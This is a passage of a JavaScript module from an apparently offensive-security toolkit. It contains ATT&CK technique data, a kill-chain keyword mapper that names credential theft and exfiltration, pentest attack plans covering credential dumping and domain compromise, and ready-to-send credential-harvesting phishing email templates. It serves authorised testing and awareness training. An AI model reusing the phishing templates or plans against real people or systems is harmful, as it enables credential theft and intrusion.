  { id: "T1082", tactic: "TA0007", name: "System Information Discovery", description: "Gather detailed system information", mitigations: ["Least privilege"], detection: ["systeminfo.exe execution", "WMI queries for system info", "uname/hostnamectl execution"] },
  { id: "T1083", tactic: "TA0007", name: "File and Directory Discovery", description: "Enumerate files and directories on a system", mitigations: ["Least privilege on file systems"], detection: ["Unusual directory listing activity", "Recursive search commands"] },
  { id: "T1057", tactic: "TA0007", name: "Process Discovery", description: "Enumerate running processes on a system", mitigations: ["Minimal process information exposure"], detection: ["tasklist/ps execution monitoring", "Process enumeration API calls"] },
  { id: "T1016", tactic: "TA0007", name: "System Network Configuration Discovery", description: "Gather network configuration information", mitigations: ["Restrict network configuration queries"], detection: ["ipconfig/ifconfig execution", "Network configuration tool usage"] },
  { id: "T1049", tactic: "TA0007", name: "System Network Connections Discovery", description: "Discover network connections to/from the system", mitigations: ["Network segmentation"], detection: ["netstat/ss execution monitoring", "Connection enumeration activity"] },
  { id: "T1069", tactic: "TA0007", name: "Permission Groups Discovery", description: "Discover security group membership", subtechniques: [
    { id: "T1069.001", name: "Local Groups", description: "Enumerate local security groups (net localgroup)" },
    { id: "T1069.002", name: "Domain Groups", description: "Enumerate domain groups (net group /domain)" },
    { id: "T1069.003", name: "Cloud Groups", description: "Enumerate cloud IAM groups and roles" },
  ], mitigations: ["Restrict group enumeration"], detection: ["Group enumeration commands", "LDAP queries for group membership"] },
  { id: "T1033", tactic: "TA0007", name: "System Owner/User Discovery", description: "Identify the primary user or owner of a system", mitigations: ["Least privilege"], detection: ["whoami/id execution monitoring"] },
  { id: "T1007", tactic: "TA0007", name: "System Service Discovery", description: "Enumerate system services", mitigations: ["Restrict service query permissions"], detection: ["sc query/systemctl execution", "Service enumeration via WMI"] },
  { id: "T1482", tactic: "TA0007", name: "Domain Trust Discovery", description: "Enumerate domain trust relationships", mitigations: ["Audit and minimize trust relationships"], detection: ["nltest /domain_trusts execution", "LDAP trust enumeration queries"] },
  { id: "T1580", tactic: "TA0007", name: "Cloud Infrastructure Discovery", description: "Discover cloud resources and configurations", mitigations: ["Least privilege IAM policies"], detection: ["Cloud API enumeration calls", "Excessive describe/list API calls"] },

  // Lateral Movement
  { id: "T1021", tactic: "TA0008", name: "Remote Services", description: "Use remote services to move laterally", subtechniques: [
    { id: "T1021.001", name: "Remote Desktop Protocol", description: "Use RDP for lateral movement" },
    { id: "T1021.002", name: "SMB/Windows Admin Shares", description: "Access C$, ADMIN$ shares for lateral movement" },
    { id: "T1021.003", name: "Distributed Component Object Model", description: "Use DCOM for remote code execution" },
    { id: "T1021.004", name: "SSH", description: "Use SSH for lateral movement on Linux/Unix" },
    { id: "T1021.005", name: "VNC", description: "Use VNC for remote GUI access" },
    { id: "T1021.006", name: "Windows Remote Management", description: "Use WinRM/PowerShell remoting for lateral movement" },
  ], mitigations: ["Network segmentation", "MFA on remote services", "Jump servers", "Disable unnecessary remote services"], detection: ["Unusual RDP/SSH sessions", "Lateral movement between workstations", "Admin share access from non-admin systems"] },
  { id: "T1570", tactic: "TA0008", name: "Lateral Tool Transfer", description: "Transfer tools or files between systems within the network", mitigations: ["Network intrusion detection", "Endpoint detection"], detection: ["SMB file transfers between workstations", "Unusual file staging on network shares"] },
  { id: "T1550", tactic: "TA0008", name: "Use Alternate Authentication Material", description: "Use non-standard authentication for lateral movement", subtechniques: [
    { id: "T1550.001", name: "Application Access Token", description: "Use stolen OAuth/SAML tokens" },
    { id: "T1550.002", name: "Pass the Hash", description: "Authenticate using NTLM hash without knowing the password" },
    { id: "T1550.003", name: "Pass the Ticket", description: "Authenticate using stolen Kerberos tickets" },
    { id: "T1550.004", name: "Web Session Cookie", description: "Use stolen session cookies for access" },
  ], mitigations: ["Credential Guard", "MFA", "Kerberos AES enforcement", "Session management"], detection: ["Pass-the-Hash detection (Event ID 4624 type 3 with NTLM)", "Anomalous Kerberos ticket usage", "Cookie replay detection"] },

  // Collection
  { id: "T1560", tactic: "TA0009", name: "Archive Collected Data", description: "Compress or encrypt collected data before exfiltration", subtechniques: [
    { id: "T1560.001", name: "Archive via Utility", description: "Use 7-Zip, WinRAR, tar for archiving" },
    { id: "T1560.002", name: "Archive via Library", description: "Use programmatic archiving (ZipFile, IO.Compression)" },
    { id: "T1560.003", name: "Archive via Custom Method", description: "Use custom compression or encryption" },
  ], mitigations: ["Data loss prevention", "Endpoint monitoring"], detection: ["Archiving tool execution", "Large archive file creation", "Encryption of collected data"] },
  { id: "T1119", tactic: "TA0009", name: "Automated Collection", description: "Use automated scripts to collect data", mitigations: ["Data classification", "DLP policies"], detection: ["Automated data access patterns", "Script execution accessing many files"] },
  { id: "T1005", tactic: "TA0009", name: "Data from Local System", description: "Collect data from the local system", mitigations: ["Data classification and encryption", "Least privilege"], detection: ["Unusual file access patterns", "Mass file reading by non-standard processes"] },
  { id: "T1039", tactic: "TA0009", name: "Data from Network Shared Drive", description: "Collect data from network shares", mitigations: ["Restrict share access", "DLP on file servers"], detection: ["Unusual network share access", "Large data access from single user"] },
  { id: "T1114", tactic: "TA0009", name: "Email Collection", description: "Collect email from local or remote email systems", subtechniques: [
    { id: "T1114.001", name: "Local Email Collection", description: "Access local email client data files (PST, OST)" },
    { id: "T1114.002", name: "Remote Email Collection", description: "Access email via Exchange Web Services, Graph API" },
    { id: "T1114.003", name: "Email Forwarding Rule", description: "Create forwarding rules to exfiltrate email" },
  ], mitigations: ["Restrict email access", "Monitor forwarding rules", "Audit EWS access"], detection: ["New email forwarding rules", "EWS access from unusual clients", "Mass email export"] },
  { id: "T1113", tactic: "TA0009", name: "Screen Capture", description: "Capture screenshots of the user's desktop", mitigations: ["Endpoint protection"], detection: ["Screen capture API calls", "Screenshot file creation"] },
  { id: "T1125", tactic: "TA0009", name: "Video Capture", description: "Capture video from the user's webcam", mitigations: ["Webcam access controls", "Physical webcam covers"], detection: ["Camera access API calls", "Video recording processes"] },

  // Command and Control
  { id: "T1071", tactic: "TA0011", name: "Application Layer Protocol", description: "Use application layer protocols for C2 communication", subtechniques: [
    { id: "T1071.001", name: "Web Protocols", description: "Use HTTP/HTTPS for C2 (blends with normal web traffic)" },
    { id: "T1071.002", name: "File Transfer Protocols", description: "Use FTP/SFTP for C2" },
    { id: "T1071.003", name: "Mail Protocols", description: "Use SMTP/IMAP for C2" },
    { id: "T1071.004", name: "DNS", description: "Use DNS queries for C2 (DNS tunneling)" },
  ], mitigations: ["Network traffic analysis", "SSL/TLS inspection", "DNS monitoring"], detection: ["Unusual DNS query patterns", "Long DNS TXT records", "Beaconing detection", "JA3/JA3S fingerprinting"] },
  { id: "T1573", tactic: "TA0011", name: "Encrypted Channel", description: "Use encryption to hide C2 communications", subtechniques: [
    { id: "T1573.001", name: "Symmetric Cryptography", description: "Use AES/RC4 for C2 encryption" },
    { id: "T1573.002", name: "Asymmetric Cryptography", description: "Use RSA/ECC for C2 key exchange" },
  ], mitigations: ["SSL/TLS inspection", "Network monitoring"], detection: ["Encrypted traffic to non-standard ports", "Self-signed certificate detection", "Unusual TLS patterns"] },
  { id: "T1105", tactic: "TA0011", name: "Ingress Tool Transfer", description: "Transfer tools from external to compromised systems", mitigations: ["Network intrusion prevention", "Web content filtering"], detection: ["File downloads from unusual sources", "PowerShell download cradle detection", "Certutil/bitsadmin abuse"] },
  { id: "T1572", tactic: "TA0011", name: "Protocol Tunneling", description: "Tunnel traffic within other protocols to avoid detection", mitigations: ["Network monitoring", "Port-protocol mismatch detection"], detection: ["DNS over HTTPS detection", "ICMP tunneling", "SSH tunneling detection"] },
  { id: "T1090", tactic: "TA0011", name: "Proxy", description: "Use proxy servers to direct C2 traffic", subtechniques: [
    { id: "T1090.001", name: "Internal Proxy", description: "Use an internal system as proxy to reach C2" },
    { id: "T1090.002", name: "External Proxy", description: "Use external proxy/redirector infrastructure" },
    { id: "T1090.003", name: "Multi-hop Proxy", description: "Chain multiple proxies to hide true C2" },
    { id: "T1090.004", name: "Domain Fronting", description: "Use CDN domain fronting to hide C2 destination" },
  ], mitigations: ["Network traffic analysis", "Block known proxy services", "JA3 fingerprinting"], detection: ["Unusual proxy usage", "Domain fronting indicators", "Tor exit node connections"] },
  { id: "T1102", tactic: "TA0011", name: "Web Service", description: "Use legitimate web services for C2", subtechniques: [
    { id: "T1102.001", name: "Dead Drop Resolver", description: "Use legitimate sites to post and retrieve C2 instructions" },
    { id: "T1102.002", name: "Bidirectional Communication", description: "Use web services for two-way C2" },
    { id: "T1102.003", name: "One-Way Communication", description: "Use web services for one-way C2 commands" },
  ], mitigations: ["Restrict access to non-business web services", "Web content filtering"], detection: ["Unusual API calls to cloud services", "High-frequency access to paste sites", "Social media C2 patterns"] },

  // Exfiltration
  { id: "T1048", tactic: "TA0010", name: "Exfiltration Over Alternative Protocol", description: "Use non-C2 protocols for data exfiltration", subtechniques: [
    { id: "T1048.001", name: "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", description: "Exfil data over encrypted non-C2 channels" },
    { id: "T1048.002", name: "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", description: "Use asymmetric encryption for exfil" },
    { id: "T1048.003", name: "Exfiltration Over Unencrypted Non-C2 Protocol", description: "Use DNS, ICMP for exfiltration" },
  ], mitigations: ["DLP systems", "Network monitoring", "DNS query analysis"], detection: ["Unusual outbound DNS volume", "ICMP payload analysis", "Large data transfers to unusual destinations"] },
  { id: "T1041", tactic: "TA0010", name: "Exfiltration Over C2 Channel", description: "Exfiltrate data over the existing C2 channel", mitigations: ["Network monitoring", "Data volume analysis"], detection: ["Increased outbound data on C2 channel", "Unusual data volume patterns"] },
  { id: "T1567", tactic: "TA0010", name: "Exfiltration Over Web Service", description: "Use web services for data exfiltration", subtechniques: [
    { id: "T1567.001", name: "Exfiltration to Code Repository", description: "Upload data to GitHub, GitLab" },
    { id: "T1567.002", name: "Exfiltration to Cloud Storage", description: "Upload to Dropbox, OneDrive, Google Drive, S3" },
    { id: "T1567.003", name: "Exfiltration to Text Storage Sites", description: "Upload to Pastebin, Hastebin" },
    { id: "T1567.004", name: "Exfiltration Over Webhook", description: "Exfiltrate via Slack, Discord webhooks" },
  ], mitigations: ["Cloud DLP", "Restrict cloud storage access", "Monitor webhook usage"], detection: ["Large uploads to cloud storage", "Unusual code repository push activity", "Webhook POST requests with large payloads"] },
  { id: "T1052", tactic: "TA0010", name: "Exfiltration Over Physical Medium", description: "Exfiltrate data via physical media", subtechniques: [
    { id: "T1052.001", name: "Exfiltration over USB", description: "Copy data to removable USB drives" },
  ], mitigations: ["USB device policies", "DLP endpoint agent", "Disable USB storage"], detection: ["USB device insertion events", "Large file copies to removable media"] },
  { id: "T1029", tactic: "TA0010", name: "Scheduled Transfer", description: "Schedule data exfiltration at specific intervals", mitigations: ["Network monitoring during off-hours"], detection: ["Regular data transfer patterns", "Scheduled task execution followed by network activity"] },
  { id: "T1537", tactic: "TA0010", name: "Transfer Data to Cloud Account", description: "Move data to adversary-controlled cloud accounts", mitigations: ["Cloud DLP", "Monitor cloud account activity"], detection: ["Data transfer to external cloud accounts", "Unusual cloud-to-cloud data movement"] },

  // Impact
  { id: "T1486", tactic: "TA0040", name: "Data Encrypted for Impact", description: "Encrypt data to deny access (ransomware)", mitigations: ["Offline backups", "Volume Shadow Copy protection", "Application whitelisting", "Endpoint detection"], detection: ["Mass file encryption activity", "Known ransomware signatures", "Unusual file modification patterns", "Canary file monitoring"] },
  { id: "T1485", tactic: "TA0040", name: "Data Destruction", description: "Destroy data on target systems (wiper malware)", mitigations: ["Offline backups", "File integrity monitoring", "Endpoint detection"], detection: ["Mass file deletion", "Disk wipe tool execution", "MBR modification"] },
  { id: "T1489", tactic: "TA0040", name: "Service Stop", description: "Stop critical services to cause disruption", mitigations: ["Restrict service management permissions", "Protected process light"], detection: ["Critical service stop events", "Unexpected service state changes"] },
  { id: "T1490", tactic: "TA0040", name: "Inhibit System Recovery", description: "Delete backups and recovery options", mitigations: ["Immutable backups", "Offline backup copies", "Restrict backup deletion"], detection: ["Volume Shadow Copy deletion", "bcdedit changes", "Backup system tampering"] },
  { id: "T1498", tactic: "TA0040", name: "Network Denial of Service", description: "Flood the target with traffic to deny service", subtechniques: [
    { id: "T1498.001", name: "Direct Network Flood", description: "Volumetric DDoS attacks (UDP flood, SYN flood)" },
    { id: "T1498.002", name: "Reflection Amplification", description: "Use reflection/amplification (DNS, NTP, memcached)" },
  ], mitigations: ["DDoS mitigation services", "Rate limiting", "Traffic scrubbing"], detection: ["Traffic volume anomalies", "Source IP spoofing patterns", "Amplification protocol abuse"] },
  { id: "T1491", tactic: "TA0040", name: "Defacement", description: "Modify visual content of web systems", subtechniques: [
    { id: "T1491.001", name: "Internal Defacement", description: "Modify internal web resources" },
    { id: "T1491.002", name: "External Defacement", description: "Modify public-facing web content" },
  ], mitigations: ["Content integrity monitoring", "Access controls on web content", "Immutable deployments"], detection: ["Web content change monitoring", "Unauthorized file modifications on web servers"] },
  { id: "T1496", tactic: "TA0040", name: "Resource Hijacking", description: "Hijack compute resources for cryptomining or other purposes", mitigations: ["Application whitelisting", "Container security", "Resource monitoring"], detection: ["High CPU usage anomalies", "Known cryptominer signatures", "Unusual process resource consumption"] },
];

// ═══════════════════════════════════════════════════════════════════════════════
// KILL CHAIN MAPPER
// ═══════════════════════════════════════════════════════════════════════════════

export const KILL_CHAIN_PHASES = [
  { phase: 1, name: "Reconnaissance", description: "Research, identify, and select targets", activities: ["OSINT gathering", "Social media profiling", "Network scanning", "DNS enumeration", "Employee identification", "Technology fingerprinting"], mitre_tactics: ["TA0043"] },
  { phase: 2, name: "Weaponization", description: "Develop weapons and prepare delivery mechanisms", activities: ["Payload creation", "Exploit development", "Document weaponization", "Infrastructure setup", "C2 configuration", "Evasion testing"], mitre_tactics: ["TA0042"] },
  { phase: 3, name: "Delivery", description: "Transmit weapon to target", activities: ["Phishing emails", "Watering hole attacks", "USB drops", "Supply chain insertion", "Direct exploitation", "Social engineering calls"], mitre_tactics: ["TA0001"] },
  { phase: 4, name: "Exploitation", description: "Exploit vulnerability to gain execution", activities: ["Remote code execution", "Client-side exploitation", "Macro execution", "DLL hijacking", "Authentication bypass", "Zero-day exploitation"], mitre_tactics: ["TA0002"] },
  { phase: 5, name: "Installation", description: "Install persistent backdoor", activities: ["Rootkit installation", "Registry modification", "Service creation", "Scheduled tasks", "Web shell deployment", "Firmware modification"], mitre_tactics: ["TA0003"] },
  { phase: 6, name: "Command & Control", description: "Establish C2 channel back to attacker", activities: ["HTTPS beaconing", "DNS tunneling", "Domain fronting", "Protocol tunneling", "Dead drop via web services", "Encrypted channels"], mitre_tactics: ["TA0011"] },
  { phase: 7, name: "Actions on Objectives", description: "Achieve the adversary's goal", activities: ["Data exfiltration", "Credential harvesting", "Lateral movement", "Privilege escalation", "Ransomware deployment", "System destruction"], mitre_tactics: ["TA0009", "TA0010", "TA0040"] },
];

export function mapActivityToKillChain(activity) {
  const actLower = (activity || "").toLowerCase();
  const keywords = {
    1: ["recon", "scan", "enumerate", "discover", "osint", "footprint", "dns", "whois", "shodan", "harvest", "identify"],
    2: ["payload", "weapon", "exploit dev", "compile", "build", "craft", "generate", "encode", "obfuscat", "pack", "infrastructure"],
    3: ["phish", "deliver", "email", "spear", "water hole", "drive-by", "usb drop", "social engineer", "vish", "smish"],
    4: ["exploit", "execute", "rce", "code execution", "buffer overflow", "injection", "xss", "sqli", "deserializ", "macro"],
    5: ["persist", "install", "backdoor", "implant", "rootkit", "registry", "service creat", "scheduled task", "web shell", "startup"],
    6: ["c2", "command and control", "beacon", "callback", "tunnel", "proxy", "domain front", "dns tunnel", "covert channel"],
    7: ["exfil", "steal", "ransomware", "encrypt", "destroy", "wipe", "harvest cred", "lateral", "pivot", "dump", "collect"],
  };
  const matches = [];
  for (const [phase, kws] of Object.entries(keywords)) {
    for (const kw of kws) {
      if (actLower.includes(kw)) {
        matches.push(KILL_CHAIN_PHASES[parseInt(phase) - 1]);
        break;
      }
    }
  }
  return matches.length ? matches : [{ phase: 0, name: "Unknown", description: "Activity could not be mapped to a kill chain phase" }];
}

// ═══════════════════════════════════════════════════════════════════════════════
// ATTACK PLANNING ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

export function generateAttackPlan(targetType, options = {}) {
  const plans = {
    "web-app": {
      name: "Web Application Penetration Test",
      phases: [
        { name: "Reconnaissance", duration: "1-2 days", tasks: [
          { task: "Subdomain enumeration", tools: ["subfinder", "amass", "darknode-recon"], techniques: ["T1595.003", "T1590.002"] },
          { task: "Technology fingerprinting", tools: ["whatweb", "wappalyzer", "darknode-fingerprint"], techniques: ["T1592.002"] },
          { task: "Directory brute-forcing", tools: ["gobuster", "ffuf", "darknode-webscan"], techniques: ["T1595.003"] },
          { task: "API endpoint discovery", tools: ["darknode-apifuzz", "burpsuite"], techniques: ["T1595.002"] },
          { task: "JavaScript analysis", tools: ["linkfinder", "secretfinder"], techniques: ["T1593.003"] },
          { task: "Google dorking", tools: ["darknode-ghdb"], techniques: ["T1593.002"] },
        ]},
        { name: "Vulnerability Assessment", duration: "2-3 days", tasks: [
          { task: "SQL injection testing", tools: ["sqlmap", "darknode-apifuzz"], techniques: ["T1190"] },
          { task: "XSS testing", tools: ["dalfox", "xsstrike"], techniques: ["T1190"] },
          { task: "Authentication testing", tools: ["burpsuite", "darknode-brute"], techniques: ["T1110"] },
          { task: "Authorization testing (IDOR)", tools: ["burpsuite", "autorize"], techniques: ["T1190"] },
          { task: "SSRF testing", tools: ["burpsuite"], techniques: ["T1190"] },
          { task: "File upload testing", tools: ["burpsuite"], techniques: ["T1190"] },
          { task: "Business logic testing", tools: ["manual"], techniques: ["T1190"] },
          { task: "API security testing", tools: ["darknode-apifuzz", "postman"], techniques: ["T1190"] },
        ]},
        { name: "Exploitation", duration: "1-2 days", tasks: [
          { task: "Exploit confirmed vulnerabilities", tools: ["custom scripts", "darknode-payload"], techniques: ["T1190"] },
          { task: "Chain vulnerabilities for maximum impact", tools: ["manual", "darknode-chain"], techniques: ["T1190"] },
          { task: "Attempt privilege escalation via web vulnerabilities", tools: ["custom scripts"], techniques: ["T1068"] },
          { task: "Demonstrate data access", tools: ["sqlmap", "custom scripts"], techniques: ["T1005"] },
        ]},
        { name: "Post-Exploitation", duration: "1 day", tasks: [
          { task: "Assess data exposure", tools: ["manual", "darknode-loot"], techniques: ["T1005"] },
          { task: "Test for lateral movement paths", tools: ["darknode-pivot"], techniques: ["T1021"] },
          { task: "Document evidence", tools: ["screenshots", "darknode-evidence"], techniques: [] },
        ]},
        { name: "Reporting", duration: "2-3 days", tasks: [
          { task: "Generate findings report", tools: ["darknode-report"], techniques: [] },
          { task: "Risk rating and prioritization", tools: ["darknode-report"], techniques: [] },
          { task: "Remediation recommendations", tools: ["darknode-report"], techniques: [] },
          { task: "Executive summary", tools: ["darknode-report"], techniques: [] },
        ]},
      ],
      estimatedDays: "7-11 days",
      team: "1-2 testers",
    },
    "internal-network": {
      name: "Internal Network Penetration Test",
      phases: [
        { name: "Network Discovery", duration: "1-2 days", tasks: [
          { task: "Host discovery (ARP, ICMP, TCP)", tools: ["nmap", "darknode-netscan", "netdiscover"], techniques: ["T1018", "T1046"] },
          { task: "Port scanning (top 1000, full)", tools: ["nmap", "masscan"], techniques: ["T1046"] },
          { task: "Service enumeration and versioning", tools: ["nmap", "darknode-enum"], techniques: ["T1046"] },
          { task: "SNMP enumeration", tools: ["snmpwalk", "onesixtyone"], techniques: ["T1046"] },
          { task: "SMB enumeration", tools: ["enum4linux", "smbclient", "crackmapexec"], techniques: ["T1087.002"] },
          { task: "LDAP enumeration", tools: ["ldapsearch", "bloodhound"], techniques: ["T1087.002", "T1069.002"] },
          { task: "DNS enumeration (zone transfer, brute)", tools: ["dig", "dnsrecon", "darknode-recon"], techniques: ["T1590.002"] },
        ]},
        { name: "Vulnerability Assessment", duration: "1-2 days", tasks: [
          { task: "Vulnerability scanning", tools: ["nessus", "openvas", "nuclei"], techniques: ["T1595.002"] },
          { task: "Default credential testing", tools: ["hydra", "medusa", "darknode-brute"], techniques: ["T1078.001"] },
          { task: "Password spraying", tools: ["crackmapexec", "darknode-spray-smart"], techniques: ["T1110.003"] },
          { task: "LLMNR/NBT-NS poisoning", tools: ["responder", "inveigh"], techniques: ["T1557.001"] },
          { task: "Relay attacks (SMB, LDAP)", tools: ["ntlmrelayx", "impacket"], techniques: ["T1557.001"] },
        ]},
        { name: "Exploitation & Escalation", duration: "2-3 days", tasks: [
          { task: "Exploit vulnerable services", tools: ["metasploit", "custom exploits"], techniques: ["T1190", "T1068"] },
          { task: "Kerberoasting", tools: ["rubeus", "impacket", "darknode-ad"], techniques: ["T1558.003"] },
          { task: "AS-REP roasting", tools: ["rubeus", "impacket"], techniques: ["T1558.004"] },
          { task: "LSASS credential dumping", tools: ["mimikatz", "procdump"], techniques: ["T1003.001"] },
          { task: "SAM database extraction", tools: ["impacket-secretsdump"], techniques: ["T1003.002"] },
          { task: "Pass-the-Hash attacks", tools: ["crackmapexec", "impacket"], techniques: ["T1550.002"] },
          { task: "Token impersonation", tools: ["incognito", "potato exploits"], techniques: ["T1134.001"] },
          { task: "Local privilege escalation", tools: ["winPEAS", "linPEAS", "darknode-engage"], techniques: ["T1068", "T1548"] },
        ]},
        { name: "Domain Compromise", duration: "1-2 days", tasks: [
          { task: "BloodHound analysis for attack paths", tools: ["bloodhound", "sharphound"], techniques: ["T1482", "T1069.002"] },
          { task: "DCSync attack", tools: ["mimikatz", "impacket-secretsdump"], techniques: ["T1003.006"] },
          { task: "Golden Ticket creation", tools: ["mimikatz", "rubeus"], techniques: ["T1558.001"] },
          { task: "Group policy abuse", tools: ["sharphound", "custom scripts"], techniques: ["T1484"] },
          { task: "Certificate abuse (ESC1-ESC8)", tools: ["certipy", "certify"], techniques: ["T1649"] },
        ]},
        { name: "Post-Exploitation", duration: "1-2 days", tasks: [
          { task: "Lateral movement demonstration", tools: ["psexec", "wmiexec", "darknode-pivot"], techniques: ["T1021.002", "T1047"] },
          { task: "Data collection and sensitivity assessment", tools: ["darknode-loot", "manual"], techniques: ["T1005", "T1039"] },
          { task: "Persistence demonstration", tools: ["darknode-persist"], techniques: ["T1547", "T1543"] },
          { task: "Evidence collection and cleanup", tools: ["darknode-evidence"], techniques: [] },
        ]},
        { name: "Reporting", duration: "3-5 days", tasks: [
          { task: "Generate comprehensive report", tools: ["darknode-report"], techniques: [] },
          { task: "Attack path documentation", tools: ["bloodhound", "darknode-report"], techniques: [] },
          { task: "Risk analysis and scoring", tools: ["darknode-report"], techniques: [] },
          { task: "Remediation prioritization", tools: ["darknode-report"], techniques: [] },
        ]},
      ],
      estimatedDays: "10-16 days",
      team: "2-3 testers",
    },
    "cloud": {
      name: "Cloud Infrastructure Penetration Test",
      phases: [
        { name: "Cloud Reconnaissance", duration: "1-2 days", tasks: [
          { task: "Cloud service enumeration (AWS/Azure/GCP)", tools: ["darknode-cloud", "cloudenum", "ScoutSuite"], techniques: ["T1580"] },
          { task: "S3/Blob/GCS bucket enumeration", tools: ["cloud_enum", "s3scanner"], techniques: ["T1580"] },
          { task: "IAM user and role enumeration", tools: ["enumerate-iam", "pacu"], techniques: ["T1087.004"] },
          { task: "Public IP and DNS enumeration", tools: ["darknode-recon"], techniques: ["T1590.005"] },
          { task: "Certificate transparency log search", tools: ["crt.sh", "certspotter"], techniques: ["T1596.003"] },
        ]},
        { name: "Cloud Exploitation", duration: "2-3 days", tasks: [
          { task: "IAM privilege escalation", tools: ["pacu", "pmapper"], techniques: ["T1078.004", "T1098.003"] },
          { task: "Instance metadata service abuse (IMDS)", tools: ["custom scripts"], techniques: ["T1552.005"] },
          { task: "Serverless function abuse", tools: ["custom scripts"], techniques: ["T1059.009"] },
          { task: "Storage account key extraction", tools: ["pacu", "azure-cli"], techniques: ["T1555.006"] },
          { task: "Cross-account pivot", tools: ["custom scripts"], techniques: ["T1199"] },
          { task: "Container escape testing", tools: ["deepce", "custom scripts"], techniques: ["T1611"] },
          { task: "Kubernetes cluster exploitation", tools: ["kubectl", "kubeaudit"], techniques: ["T1609", "T1610"] },
        ]},
        { name: "Post-Exploitation", duration: "1-2 days", tasks: [
          { task: "Data access demonstration", tools: ["aws-cli", "az", "gcloud"], techniques: ["T1530"] },
          { task: "Persistence via IAM backdoor", tools: ["pacu"], techniques: ["T1098.001"] },
          { task: "Cross-service pivot", tools: ["custom scripts"], techniques: ["T1021"] },
          { task: "Evidence collection", tools: ["darknode-evidence"], techniques: [] },
        ]},
        { name: "Reporting", duration: "2-3 days", tasks: [
          { task: "Cloud-specific findings report", tools: ["darknode-report"], techniques: [] },
          { task: "CIS benchmark compliance gap analysis", tools: ["ScoutSuite", "prowler"], techniques: [] },
          { task: "IAM permission analysis", tools: ["pmapper", "cloudsplaining"], techniques: [] },
        ]},
      ],
      estimatedDays: "6-10 days",
      team: "1-2 testers (cloud-certified)",
    },
    "active-directory": {
      name: "Active Directory Security Assessment",
      phases: [
        { name: "AD Enumeration", duration: "1-2 days", tasks: [
          { task: "Domain and forest enumeration", tools: ["bloodhound", "sharphound", "darknode-ad"], techniques: ["T1482", "T1087.002"] },
          { task: "GPO analysis", tools: ["gpresult", "Get-GPOReport"], techniques: ["T1615"] },
          { task: "ACL analysis", tools: ["bloodhound", "aclpwn"], techniques: ["T1069.002"] },
          { task: "SPN enumeration", tools: ["setspn", "Get-ADServiceAccount"], techniques: ["T1558.003"] },
          { task: "ADCS enumeration", tools: ["certipy", "certify"], techniques: ["T1649"] },
          { task: "Trust relationship mapping", tools: ["nltest", "bloodhound"], techniques: ["T1482"] },
          { task: "Password policy analysis", tools: ["net accounts", "Get-ADDefaultDomainPasswordPolicy"], techniques: [] },
        ]},
        { name: "Credential Attacks", duration: "2-3 days", tasks: [
          { task: "Password spraying", tools: ["crackmapexec", "kerbrute", "darknode-spray-smart"], techniques: ["T1110.003"] },
          { task: "Kerberoasting", tools: ["rubeus", "impacket-GetUserSPNs", "darknode-ad"], techniques: ["T1558.003"] },
          { task: "AS-REP roasting", tools: ["rubeus", "impacket-GetNPUsers"], techniques: ["T1558.004"] },
          { task: "LLMNR/NBT-NS poisoning", tools: ["responder", "inveigh"], techniques: ["T1557.001"] },
          { task: "Credential dumping (LSASS, SAM, NTDS)", tools: ["mimikatz", "impacket"], techniques: ["T1003"] },
          { task: "DPAPI credential extraction", tools: ["mimikatz", "SharpDPAPI"], techniques: ["T1555"] },
        ]},
        { name: "Domain Escalation", duration: "1-2 days", tasks: [
          { task: "ACL-based escalation paths", tools: ["bloodhound", "aclpwn"], techniques: ["T1098"] },
          { task: "Group membership abuse", tools: ["net group", "Add-ADGroupMember"], techniques: ["T1098"] },
          { task: "ADCS certificate abuse (ESC1-ESC8)", tools: ["certipy"], techniques: ["T1649"] },
          { task: "Constrained delegation abuse", tools: ["rubeus", "impacket"], techniques: ["T1550.003"] },
          { task: "Resource-based constrained delegation", tools: ["rbcd.py", "impacket"], techniques: ["T1134"] },
          { task: "DCSync", tools: ["mimikatz", "impacket-secretsdump"], techniques: ["T1003.006"] },
          { task: "Golden Ticket", tools: ["mimikatz", "rubeus"], techniques: ["T1558.001"] },
          { task: "Silver Ticket", tools: ["mimikatz", "rubeus"], techniques: ["T1558.002"] },
        ]},
        { name: "Persistence & Post-Exploitation", duration: "1 day", tasks: [
          { task: "Demonstrate persistence mechanisms", tools: ["darknode-persist"], techniques: ["T1547", "T1543", "T1098"] },
          { task: "Lateral movement demonstration", tools: ["psexec", "wmiexec", "darknode-pivot"], techniques: ["T1021"] },
          { task: "Data access assessment", tools: ["darknode-loot", "manual"], techniques: ["T1005", "T1039"] },
        ]},
        { name: "Reporting", duration: "2-3 days", tasks: [
          { task: "AD security assessment report", tools: ["darknode-report"], techniques: [] },
          { task: "Attack path visualization", tools: ["bloodhound"], techniques: [] },
          { task: "Tier model compliance analysis", tools: ["manual"], techniques: [] },
          { task: "Remediation roadmap", tools: ["darknode-report"], techniques: [] },
        ]},
      ],
      estimatedDays: "7-11 days",
      team: "2-3 testers (AD-experienced)",
    },
  };

  const plan = plans[targetType] || plans["web-app"];
  if (options.scope === "limited") {
    plan.phases = plan.phases.filter((p) => !p.name.includes("Post-Exploitation"));
    plan.estimatedDays = plan.estimatedDays.split("-").map((d) => Math.max(1, parseInt(d) - 2)).join("-") + " days";
  }
  return plan;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHISHING CAMPAIGN BUILDER
// ═══════════════════════════════════════════════════════════════════════════════

export const PHISHING_TEMPLATES = [
  {
    name: "Password Expiry Notice",
    subject: "Action Required: Your password expires in 24 hours",
    category: "credential-harvest",
    pretext: "IT Department notification about expiring credentials",
    body: `Dear {{first_name}},

Your {{company}} password will expire in 24 hours. To avoid being locked out of your account, please update your password immediately.

Click here to update your password: {{link}}

If you do not update your password by {{deadline}}, your account will be temporarily disabled for security purposes.

Thank you,
{{company}} IT Support
{{support_email}}`,
    variables: ["first_name", "company", "link", "deadline", "support_email"],
    indicators_of_phishing: ["urgency", "password change link", "threat of account lockout"],
    red_flags_for_training: ["External link for internal password change", "Generic greeting options", "Urgency tactics", "No direct IT contact info"],
  },
  {
    name: "Document Shared",
    subject: "{{sender_name}} shared a document with you",
    category: "credential-harvest",
    pretext: "Colleague sharing a work document via cloud storage",
    body: `Hi {{first_name}},

{{sender_name}} ({{sender_email}}) has shared a document with you:

{{document_name}}

"{{message}}"

View Document: {{link}}

This link will expire in 7 days.

- {{company}} File Sharing`,
    variables: ["first_name", "sender_name", "sender_email", "document_name", "message", "link", "company"],
    indicators_of_phishing: ["shared document lure", "external link", "expiring access"],
    red_flags_for_training: ["External domain hosting the document", "Sender email doesn't match display name", "No option to preview without clicking"],
  },
  {
    name: "Invoice/Payment",
